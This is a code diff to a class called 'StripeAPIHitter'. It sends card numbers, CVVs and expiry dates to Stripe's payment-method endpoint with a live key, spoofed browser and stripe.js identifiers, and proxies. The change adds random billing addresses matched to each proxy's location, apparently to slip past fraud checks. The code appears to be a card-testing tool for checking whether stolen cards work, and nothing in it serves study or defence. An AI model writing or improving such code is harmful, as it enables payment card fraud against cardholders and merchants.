@@ -511,6 +511,8 @@ class StripeAPIHitter:
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
             }
 
+            address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)
+
             # 1. Generate Payment Method Token
             pm_url = "https://api.stripe.com/v1/payment_methods"
             pm_data = {
@@ -519,8 +521,11 @@ class StripeAPIHitter:
                 "card[cvc]": card['cvv'],
                 "card[exp_month]": card['month'],
                 "card[exp_year]": card['year'],
-                "billing_details[address][postal_code]": "10001",
-                "billing_details[address][country]": "US",
+                "billing_details[address][line1]": address["line1"],
+                "billing_details[address][city]": address["city"],
+                "billing_details[address][state]": address["state"],
+                "billing_details[address][postal_code]": address["zip"],
+                "billing_details[address][country]": address["country"],
                 "key": self.pk_live,
                 "payment_user_agent": "stripe.js/b60285dd61; stripe-js-v3/b60285dd61; checkout",
             }
